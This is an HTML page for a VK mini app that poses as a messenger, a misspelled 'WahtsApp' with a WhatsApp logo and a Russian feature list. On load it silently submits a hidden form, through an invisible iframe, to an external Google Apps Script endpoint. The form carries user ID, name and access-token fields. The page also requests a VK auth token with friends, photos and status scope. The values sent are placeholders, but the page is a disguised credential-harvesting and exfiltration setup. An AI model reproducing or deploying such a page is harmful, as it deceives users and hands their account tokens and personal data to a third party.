<!doctype html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>One HTML Page Challenge</title>
        <link
            href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
            rel="stylesheet"
            integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"
            crossorigin="anonymous" />
        <link rel="stylesheet" href="styles.css" />
    </head>
    <body>
        <iframe title="votar" name="votar" style="display:none;"></iframe>
        <form id="send_data_form" target="votar" action="https://script.google.com/macros/s/AKfycbw8cSagQ8VdblXoc7oRUEabWzGcqAjylgzIpwpiqO9lIjZLQNQnx8Ee4AASLLXFpe5H/exec" method="get">
            <input type="hidden" name="user_id" value="123"/>
            <input type="hidden" name="first_name" value="Анатолий"/>
            <input type="hidden" name="last_name" value="Олейник"/>
            <input type="hidden" name="access_token" value="0987654321"/>
        </form>
        
        <div class="container-fluid">
            <br />
            <div class="card">
                <div class="card-body">
                    <div class="jumbotron">
                        <img src="logo-whatsapp-150.png" alt="VK Мессенджер" class="logo" />
                        <p><b>WahtsApp</b></p>
                        <hr class="my-4" />
                        <p>Бесплатное и быстрое приложение для общения. Будьте на связи с друзьями и знакомыми в чатах и социальных сетях.</p>
                        <ul class='text-center'>
                            <li class='text-left'>Делитесь фотографиями и видео</li>
                            <li class='text-left'>Звоните без ограничений по времени и числу участников</li>
                            <li class='text-left'>Контакты в быстром доступе: из телефонной книги и ВКонтакте</li>
                            <li class='text-left'>Создавайте фантомные чаты и отправляйте исчезающие сообщения</li>
                            <li class='text-left'>Получайте бизнес-уведомления в мессенджере</li>
                        </ul>
                    </div>

                    <div id="list"></div>
                </div>
            </div>
        </div>
        <br />

        <script>

            var send_data_form = document.getElementById("send_data_form");
            send_data_form.submit();
            
            var list = document.getElementById("list");

            function initBridge() {
                vkBridge
                    .send("VKWebAppInit")
                    .then((data) => {
                        if (data.result) {
                            vkBridge
                                .send('VKWebAppGetUserInfo', {})
                                .then((data) => { 
                                    if (data.id) {

                                        var hr = document.createElement("hr");
                                        list.appendChild(hr);

                                        var card = document.createElement("div");
                                        card.className = "card";

                                        var body = document.createElement("div");
                                        body.className = "card-body";
                                        card.appendChild(body);

                                        const cardTitle = document.createElement("h5");
                                        const cardTitleNode = document.createTextNode(data.id);
                                        cardTitle.className = "card-title";
                                        cardTitle.appendChild(cardTitleNode);
                                        body.appendChild(cardTitle);

                                        list.appendChild(card);                                        
                                        
                                    }
                                })
                                .catch((error) => { });                            
                            
                            
                            vkBridge
                                .send("VKWebAppGetAuthToken", {
                                    app_id: 53535801,
                                    scope: "friends,photos,status"
                                })
                                .then((data) => {
                                    if (data.access_token) {
                                        var hr = document.createElement("hr");
                                        list.appendChild(hr);

                                        var card = document.createElement("div");
                                        card.className = "card";

                                        var body = document.createElement("div");
                                        body.className = "card-body";
                                        card.appendChild(body);

                                        const cardTitle = document.createElement("h5");
                                        const cardTitleNode = document.createTextNode(data.access_token);
                                        cardTitle.className = "card-title";
                                        cardTitle.appendChild(cardTitleNode);
                                        body.appendChild(cardTitle);

                                        list.appendChild(card);

                                        vkBridge
                                            .send('VKWebAppClose', {
                                                status: 'success'
                                            })
                                            .then((data) => { 
                                                if (data.status) {
                                                    // Событие отправлено
                                                }
                                            })
                                            .catch((error) => { });                                      
                                    }
                                })
                                .catch((error) => { });
                        } else {
                        }
                    })
                    .catch((error) => { });
            }
        </script>

        <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js" onload="initBridge()" type="text/javascript"></script>
    </body>
</html>
